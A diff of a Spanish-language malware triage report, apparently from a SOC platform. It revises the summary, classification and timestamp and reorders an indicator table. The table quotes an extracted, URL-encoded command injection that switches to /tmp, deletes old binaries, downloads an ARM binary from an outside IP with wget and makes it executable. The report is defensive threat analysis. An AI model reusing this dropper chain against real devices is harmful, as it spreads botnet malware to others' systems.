@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto de 368 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.14. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 5 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:49:11+00:00`
+- **Registrado:** `2026-08-09T19:49:11.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -51,12 +51,12 @@ startip=1.1.1.XXX;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 1.1.1.XXX | static_analysis |
+| ip | 201.51.13.XXX | static_analysis |
 | ip | 190.179.168.XXX | static_analysis |
 | ip | 2.2.2.XXX | static_analysis |
-| ip | 201.51.13.XXX | static_analysis |
-| hash | 9a05817e653efa272203ab8614252481bdbf819a8c3d179abd9b3ca30e652f98 | static_analysis |
+| ip | 1.1.1.XXX | static_analysis |
 | command | startip=1.1.1.XXX;cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai | strings |
+| hash | 9a05817e653efa272203ab8614252481bdbf819a8c3d179abd9b3ca30e652f98 | static_analysis |
 
 ## 🔎 Triage
 
